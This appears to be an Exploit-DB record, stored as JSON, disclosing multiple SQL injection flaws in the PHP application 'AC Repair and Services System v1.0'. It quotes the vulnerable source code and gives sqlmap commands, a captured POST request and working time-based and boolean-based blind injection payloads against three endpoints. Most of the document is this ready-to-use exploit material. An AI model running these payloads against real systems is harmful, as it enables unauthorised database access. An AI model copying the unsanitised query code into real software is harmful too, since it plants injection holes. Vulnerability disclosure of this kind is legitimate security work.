{"source": "https://www.exploit-db.com/exploits/51844", "vulnName": "AC Repair and Services System v1.0 - Multiple SQL Injection", "vulnEDBID": "51844", "vulnCVE": "N/A", "author": "GNANARAJ MAUVIEL", "exploitType": "REMOTE", "platform": "PHP", "datePublished": "2024-03-03", "vulnContent": "# Exploit Title: AC Repair and Services System v1.0 - Multiple SQL Injection\n# Date: 27 December 2023\n# Exploit Author: Gnanaraj Mauviel (@0xm3m)\n# Vendor: oretnom23\n# Vendor Homepage: https://www.sourcecodester.com/php/16513/ac-repair-and-services-system-using-php-and-mysql-source-code-free-download.html\n# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-acrss.zip\n# Version: v1.0\n# Tested on: Mac OSX, XAMPP, Apache, MySQL\n\n-------------------------------------------------------------------------------------------------------------------------------------------\n\nSource Code(/php-acrss/admin/user/manage_user.php):\n\n<?php \nif(isset($_GET['id'])){\n    $user = $conn->query(\"SELECT * FROM users where id ='{$_GET['id']}' \");\n    foreach($user->fetch_array() as $k =>$v){\n        $meta[$k] = $v;\n    }\n}\n?>\n\n-> sqlmap -u \"http://localhost/php-acrss/admin/?page=user/manage_user&id=\" --batch\n---\nParameter: id (GET)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: page=user/manage_user&id=' AND (SELECT 5500 FROM (SELECT(SLEEP(5)))hiCZ) AND 'rZIs'='rZIs\n---\n\nSource Code(/php-acrss/classes/Master.php):\n\nfunction delete_inquiry(){\n  extract($_POST);\n  $del = $this->conn->query(\"DELETE FROM `inquiry_list` where id = '{$id}'\");\n  if($del){\n   $resp['status'] = 'success';\n   $this->settings->set_flashdata('success',\" Inquiry successfully deleted.\");\n  }else{\n   $resp['status'] = 'failed';\n   $resp['error'] = $this->conn->error;\n  }\n  return json_encode($resp);\n\n }\n\n-> sqlmap -u \"http://localhost/php-acrss/classes/Master.php?f=delete_inquiry\" --data=\"id=*\" --batch\n---\nParameter: #1* ((custom) POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: id=' AND (SELECT 7930 FROM (SELECT(SLEEP(5)))XwlG) AND 'Jimw'='Jimw\n---\n\nSource Code(/php-acrss/classes/Users.php):\n\n$qry = $this->conn->query(\"UPDATE users set $data where id = {$id}\");\n   if($qry){\n    $this->settings->set_flashdata('success','User Details successfully updated.');\n    foreach($_POST as $k => $v){\n     if($k != 'id'){\n      if(!empty($data)) $data .=\" , \";\n      if($this->settings->userdata('id') == $id)\n       $this->settings->set_userdata($k,$v);\n     }\n    }\n\nPOST /php-acrss/classes/Users.php?f=save HTTP/1.1\nHost: localhost\nContent-Length: 943\nsec-ch-ua: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\"\nAccept: */*\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryAUtgvsSwiJifz27g\nX-Requested-With: XMLHttpRequest\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36\nsec-ch-ua-platform: \"macOS\"\nOrigin: http://localhost\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost/php-acrss/admin/?page=user/manage_user&id=9\nAccept-Encoding: gzip, deflate, br\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nCookie: PHPSESSID=o92n8nati3696kg69plidv5e77\nConnection: close\n\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"id\"\n\n9\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"firstname\"\n\nClaire\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"middlename\"\n\n\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"lastname\"\n\nBlake\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"username\"\n\ncblake\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"password\"\n\n\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"type\"\n\n2\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"img\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundaryAUtgvsSwiJifz27g--\n\n-> sqlmap -r ~/Documents/POST-localhost.txt --batch\n\n---\nParameter: MULTIPART id ((custom) POST)\n    Type: boolean-based blind\n    Title: Boolean-based blind - Parameter replace (original value)\n    Payload: ------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"id\"\n\n(SELECT (CASE WHEN (3947=3947) THEN 9 ELSE (SELECT 2252 UNION SELECT 2638) END))\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"firstname\"\n\nClaire\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"middlename\"\n\n\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"lastname\"\n\nBlake\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"username\"\n\ncblake\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"password\"\n\n\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"type\"\n\n2\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"img\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundaryAUtgvsSwiJifz27g--\n\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: ------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"id\"\n\n9 AND (SELECT 7168 FROM (SELECT(SLEEP(5)))pifO)\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"firstname\"\n\nClaire\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"middlename\"\n\n\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"lastname\"\n\nBlake\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"username\"\n\ncblake\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"password\"\n\n\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"type\"\n\n2\n------WebKitFormBoundaryAUtgvsSwiJifz27g\nContent-Disposition: form-data; name=\"img\"; filename=\"\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundaryAUtgvsSwiJifz27g--\n---\n            "}